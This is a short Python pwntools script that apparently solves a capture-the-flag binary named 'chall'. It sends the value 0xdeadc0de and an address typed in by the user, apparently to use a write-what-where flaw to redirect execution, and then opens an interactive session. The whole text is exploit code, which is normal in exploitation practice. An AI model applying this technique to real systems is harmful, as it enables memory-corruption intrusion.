import pwn
import sys

elf = pwn.ELF('./chall')
io = elf.process()
print(io.recv(100000).decode("utf-8"))

#What
newReturn = bytes(str(0xdeadc0de), 'ASCII')
io.sendline(newReturn)

#Where
print(io.recv(1000).decode("utf-8"))
address = input()
address = bytes(str(int(address,16)), 'ASCII')
io.sendline(address)
print(io.recvrepeat(1).decode("utf-8"))
io.interactive()